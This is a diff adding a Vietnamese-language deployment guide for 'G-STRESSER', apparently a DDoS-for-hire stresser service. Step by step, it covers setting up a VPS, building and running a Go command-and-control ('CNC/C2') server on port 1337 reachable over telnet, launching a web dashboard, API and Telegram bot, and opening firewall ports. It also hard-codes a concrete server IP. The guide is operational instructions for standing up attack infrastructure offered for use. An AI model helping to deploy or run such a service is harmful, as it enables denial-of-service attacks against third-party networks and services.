@@ -1,0 +1,101 @@
+G-STRESSER Deployment Guide (from scratch to Production)
+=========================================================
+
+1. CẬP NHẬT VPS VÀ CÀI ĐẶT CÁC PHẦN MỀM CẦN THIẾT
+------------------------------------------------
+Mở terminal VPS và chạy lần lượt các lệnh sau:
+
+# Cập nhật danh sách gói phần mềm
+sudo apt update && sudo apt upgrade -y
+
+# Cài đặt các công cụ cơ bản
+sudo apt install -y curl wget git build-essential screen unzip tmux libpcap-dev telnet
+
+# Cài đặt Node.js (phiên bản 18.x) và npm
+curl -fsSL https://deb.nodesource.com/setup_18.x | sudo -E bash -
+sudo apt install -y nodejs
+
+# Cài đặt Go (Golang) mới nhất
+wget https://go.dev/dl/go1.22.1.linux-amd64.tar.gz
+sudo rm -rf /usr/local/go && sudo tar -C /usr/local -xzf go1.22.1.linux-amd64.tar.gz
+echo "export PATH=\$PATH:/usr/local/go/bin" >> ~/.profile
+source ~/.profile
+
+# Kiểm tra cài đặt thành công:
+node -v      # Phải hiện v18.x.x
+npm -v       # Phải hiện 9.x.x hoặc cao hơn
+go version   # Phải hiện go version go1.22.1 linux/amd64
+
+# Cài đặt PM2 (Công cụ quản lý tiến trình Node.js)
+sudo npm install -g pm2
+
+
+2. TRIỂN KHAI MÃ NGUỒN (SOURCE CODE)
+------------------------------------
+# 1. Upload hoặc clone mã nguồn của bạn lên VPS
+# Giả sử mã nguồn G-STRESSER được đặt tại thư mục ~/G-STRESSER
+
+cd ~/G-STRESSER
+
+# 2. Cài đặt các thư viện Node.js cho API/Website
+sudo npm install
+
+
+3. CẤU HÌNH DATABASE & ĐỊA CHỈ IP
+---------------------------------
+Mở file `database/settings.json` và cập nhật:
+- "cncHost": Khai báo IP của VPS này (VD: "103.77.246.163")
+- "cncPort": "1337"
+
+Mở file `src/bot.js` kiểm tra biến:
+- const API_BASE_URL = 'http://103.77.246.163:8880';
+- const WEB_DASHBOARD = 'http://103.77.246.163:8880/dashboard';
+
+
+4. BUILD VÀ CHẠY GO CNC (C2 TERMINAL)
+-------------------------------------
+# Vào thư mục chứa C2
+cd ~/G-STRESSER/c2
+
+# Build file thực thi CNC
+go build -o cnc .
+
+# Cấp quyền thiết lập (nếu cần)
+chmod +x cnc
+
+# Chạy C2 nền bằng tmux hoặc screen
+screen -S cnc
+./cnc > cnc.log 2>&1
+# (Nhấn Ctrl+A, sau đó nhấn D để thoát màn hình nền screen mà cnc vẫn chạy)
+
+
+5. CHẠY NODE.JS API & WEBSITE (BẰNG PM2)
+----------------------------------------
+Vào lại thư mục gốc dự án:
+cd ~/G-STRESSER
+
+# Chạy app.js bằng PM2
+pm2 start src/app.js --name "g-stresser-web"
+
+# Lưu lại tiến trình PM2 để tự khởi động khi VPS khởi động lại
+pm2 save
+pm2 startup
+
+
+6. LƯU Ý MỞ CỔNG (FIREWALL)
+-------------------------
+Đảm bảo VPS đã mở các cổng sau trong tường lửa (UFW / AWS Security Group):
+- Cổng HTTP: 8880 (cho Web/API)
+- Cổng CNC: 1337 (cho Telnet)
+
+Ví dụ với UFW:
+sudo ufw allow 8880/tcp
+sudo ufw allow 1337/tcp
+sudo ufw reload
+
+
+7. KIỂM TRA HỆ THỐNG
+--------------------
+- Website URL: http://IP_VPS:8880
+- CNC Terminal: Mở Terminal máy tính/điện thoại gõ `telnet IP_VPS 1337`
+- Bot Telegram: Mở Bot chat /start
